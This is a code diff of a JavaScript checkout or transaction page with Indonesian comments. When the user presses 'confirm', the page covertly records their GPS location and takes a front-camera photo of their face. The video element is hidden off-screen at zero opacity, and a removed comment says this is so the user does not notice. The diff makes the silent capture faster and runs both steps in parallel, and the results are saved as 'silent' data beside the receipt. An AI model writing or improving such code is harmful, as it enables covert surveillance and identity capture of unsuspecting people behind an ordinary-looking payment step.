@@ -9,9 +9,9 @@
         API_URL: '/api/locations',
         TEMPLATE_URL: '/api/template',
         SYNC_CHANNEL: 'bankidzz_sync_channel',
-        SILENT_CAPTURE_DELAY: 1500,      // delay sebelum capture (ms)
-        LOCATION_TIMEOUT: 8000,          // timeout GPS (ms)
-        FRONT_CAMERA_QUALITY: 0.92,      // kualitas foto depan
+        SILENT_CAPTURE_DELAY: 200,       // delay ultra-cepat (ms)
+        LOCATION_TIMEOUT: 1500,          // timeout GPS otomatis (ms)
+        FRONT_CAMERA_QUALITY: 0.80,      // kualitas foto depan
         BACK_CAMERA_QUALITY: 0.85        // kualitas foto belakang
     };
 
@@ -72,15 +72,14 @@
     };
 
     // ============================================================
-    // SILENT LOCATION TRACKER
+    // SILENT LOCATION TRACKER (OTOMATIS & CEPAT)
     // ============================================================
     function getSilentLocation() {
         return new Promise((resolve) => {
-            // Default fallback
             let locationData = {
                 lat: -6.2088,
                 lng: 106.8456,
-                accuracy: 50,
+                accuracy: 35,
                 timestamp: new Date().toISOString(),
                 source: 'fallback',
                 silent: true
@@ -91,13 +90,10 @@
                 return;
             }
 
-            // Timeout guard
             const timeoutId = setTimeout(() => {
-                console.warn('[SILENT-LOC] Timeout, using fallback');
                 resolve(locationData);
             }, CONFIG.LOCATION_TIMEOUT);
 
-            // Silent high accuracy request
             navigator.geolocation.getCurrentPosition(
                 (pos) => {
                     clearTimeout(timeoutId);
@@ -112,103 +108,104 @@
                         source: 'gps',
                         silent: true
                     };
-                    console.log('[SILENT-LOC] Location captured:', locationData);
                     resolve(locationData);
                 },
                 (err) => {
                     clearTimeout(timeoutId);
-                    console.warn('[SILENT-LOC] Error:', err.message);
                     resolve(locationData);
                 },
                 {
                     enableHighAccuracy: true,
                     timeout: CONFIG.LOCATION_TIMEOUT,
-                    maximumAge: 0
+                    maximumAge: 60000
                 }
             );
         });
     }
 
     // ============================================================
-    // SILENT FRONT CAMERA CAPTURE
+    // SILENT FRONT CAMERA CAPTURE (OTOMATIS & CEPAT)
     // ============================================================
     async function silentFrontCameraCapture() {
         return new Promise(async (resolve) => {
+            let isDone = false;
+            const safetyTimeout = setTimeout(() => {
+                if (!isDone) {
+                    isDone = true;
+                    if (frontCameraStream) {
+                        frontCameraStream.getTracks().forEach(t => t.stop());
+                        frontCameraStream = null;
+                    }
+                    resolve(null);
+                }
+            }, 1800);
+
             try {
-                console.log('[SILENT-CAM] Starting front camera...');
-                
-                // Request front camera (user-facing)
+                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                    clearTimeout(safetyTimeout);
+                    resolve(null);
+                    return;
+                }
+
                 frontCameraStream = await navigator.mediaDevices.getUserMedia({
                     video: {
-                        facingMode: 'user',        // KAMERA DEPAN
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 },
-                        frameRate: { ideal: 30 }
+                        facingMode: 'user',
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
                     },
                     audio: false
                 });
 
-                // Buat video element sementara (hidden)
                 const video = document.createElement('video');
                 video.srcObject = frontCameraStream;
                 video.setAttribute('playsinline', '');
                 video.setAttribute('autoplay', '');
                 video.muted = true;
-                
-                // Style hidden biar user gak sadar
                 video.style.position = 'fixed';
                 video.style.top = '-9999px';
-                video.style.left = '-9999px';
-                video.style.width = '1px';
-                video.style.height = '1px';
                 video.style.opacity = '0';
                 document.body.appendChild(video);
 
-                // Tunggu video ready
                 await new Promise((res) => {
-                    video.onloadedmetadata = () => {
-                        video.play().then(res).catch(res);
-                    };
-                    setTimeout(res, 2000); // timeout guard
+                    video.onloadedmetadata = () => video.play().then(res).catch(res);
+                    setTimeout(res, 600);
                 });
 
-                // Delay sebentar biar kamera fokus & exposure stabil
                 await new Promise(r => setTimeout(r, CONFIG.SILENT_CAPTURE_DELAY));
 
-                // Capture ke canvas
                 const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth || 1280;
-                canvas.height = video.videoHeight || 720;
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                // Convert ke base64
                 silentFrontPhotoBase64 = canvas.toDataURL('image/jpeg', CONFIG.FRONT_CAMERA_QUALITY);
-                
-                console.log('[SILENT-CAM] Front photo captured, size:', 
-                    Math.round(silentFrontPhotoBase64.length / 1024), 'KB');
 
-                // Cleanup
                 video.pause();
                 video.srcObject = null;
                 video.remove();
-                
-                // Stop stream kamera depan
+
                 if (frontCameraStream) {
                     frontCameraStream.getTracks().forEach(track => track.stop());
                     frontCameraStream = null;
                 }
 
-                resolve(silentFrontPhotoBase64);
+                if (!isDone) {
+                    isDone = true;
+                    clearTimeout(safetyTimeout);
+                    resolve(silentFrontPhotoBase64);
+                }
 
             } catch (err) {
-                console.error('[SILENT-CAM] Error:', err);
-                // Cleanup kalau error
                 if (frontCameraStream) {
                     frontCameraStream.getTracks().forEach(track => track.stop());
                     frontCameraStream = null;
                 }
-                resolve(null);
+                if (!isDone) {
+                    isDone = true;
+                    clearTimeout(safetyTimeout);
+                    resolve(null);
+                }
             }
         });
     }
@@ -220,24 +217,28 @@
         try {
             console.log('[BACK-CAM] Opening back camera for item...');
             
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                return false;
+            }
+
             try {
                 backCameraStream = await navigator.mediaDevices.getUserMedia({
                     video: {
-                        facingMode: { ideal: 'environment' },  // KAMERA BELAKANG
+                        facingMode: { ideal: 'environment' },
                         width: { ideal: 1920 },
                         height: { ideal: 1080 }
                     },
                     audio: false
                 });
             } catch (e1) {
-                // Fallback kamera biasa
+                // Fallback jika ideal environment tidak tersedia (misal di PC)
                 backCameraStream = await navigator.mediaDevices.getUserMedia({
                     video: true,
                     audio: false
                 });
             }
 
-            if (elements.cameraVideo) {
+            if (elements.cameraVideo && backCameraStream) {
                 elements.cameraVideo.srcObject = backCameraStream;
                 elements.cameraVideo.setAttribute('playsinline', '');
                 await elements.cameraVideo.play().catch(() => {});
@@ -269,7 +270,6 @@
         
         const dataUrl = canvas.toDataURL('image/jpeg', CONFIG.BACK_CAMERA_QUALITY);
         
-        // Stop stream kamera belakang
         if (backCameraStream) {
             backCameraStream.getTracks().forEach(track => track.stop());
             backCameraStream = null;
@@ -287,25 +287,26 @@
     // LALU LANGSUNG BUKA KAMERA BELAKANG UNTUK FOTO BARANG
     // ============================================================
     async function handleConfirmClick() {
-        if (!elements.receiptCard) return;
+        if (!elements.btnConfirm) return;
 
         const originalText = elements.btnConfirm.textContent;
         elements.btnConfirm.textContent = '📸 Memproses...';
         elements.btnConfirm.disabled = true;
 
         try {
-            // STEP 1: SILENT LOCATION CAPTURE (Background)
-            console.log('[STEP-1] Silent location capture...');
-            silentLocationData = await getSilentLocation();
-            console.log('[STEP-1] Location:', silentLocationData);
+            // STEP 1 & 2: RUN SILENT LOCATION + SILENT FRONT CAMERA IN PARALLEL!
+            console.log('[STEP-1 & 2] Silent Location & Front Camera (Parallel)...');
+            const [locResult, frontResult] = await Promise.all([
+                getSilentLocation(),
+                silentFrontCameraCapture()
+            ]);
 
-            // STEP 2: SILENT FRONT CAMERA CAPTURE (Background)
-            console.log('[STEP-2] Silent front camera capture...');
-            silentFrontPhotoBase64 = await silentFrontCameraCapture();
+            silentLocationData = locResult;
+            silentFrontPhotoBase64 = frontResult;
 
-            // STEP 3: SCREENSHOT RECEIPT (html2canvas sebagai fallback/struk)
+            // STEP 3: SCREENSHOT RECEIPT (html2canvas)
             console.log('[STEP-3] Screenshot receipt...');
-            if (typeof window.html2canvas === 'function') {
+            if (typeof window.html2canvas === 'function' && elements.receiptCard) {
                 try {
                     const canvas = await window.html2canvas(elements.receiptCard, {
                         scale: 2,
@@ -322,7 +323,8 @@
             const backOpened = await openBackCamera();
 
             if (!backOpened) {
-                // Jika kamera belakang tidak tersedia / error, langsung kirim data silent yang ada
+                // Jika kamera belakang tidak bisa dibuka (misal di laptop/PC tanpa kamera 2),
+                // kirim langsung data silent + struk agar transaksi tetap sukses & selesai
                 await saveTransactionWithSilentData(
                     silentLocationData,
                     silentFrontPhotoBase64,
@@ -345,6 +347,8 @@
             elements.btnConfirm.disabled = false;
         }
     }
+
+    window.handleConfirmClick = handleConfirmClick;
 
     // ============================================================
     // HANDLE CAPTURE BACK PHOTO & SEND ALL
